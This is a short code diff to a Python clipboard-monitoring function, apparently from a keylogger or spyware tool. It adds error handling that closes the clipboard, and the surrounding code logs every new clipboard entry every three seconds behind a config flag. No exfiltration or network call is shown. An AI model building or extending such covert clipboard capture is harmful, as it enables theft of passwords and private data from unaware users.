@@ -120,6 +120,12 @@ def MonitorClipboard():  # Function to get clipboard data
             strLogs += "\n" + "\n" + "* * * * * * Clipboard * * * * * *" + "\n" + strClipData + "\n" + \
                        "* * * * * * Clipboard * * * * * *" + "\n" + "\n"
             strClipDataOld = strClipData
+            
+        try:
+            win32clipboard.CloseClipboard()  # incase clipboard has not been closed.
+        except:
+            pass
+        
         time.sleep(3)  # check every 3 seconds
 
 if blnLogClipboard == "True":  # if the user wants to capture clipboard data
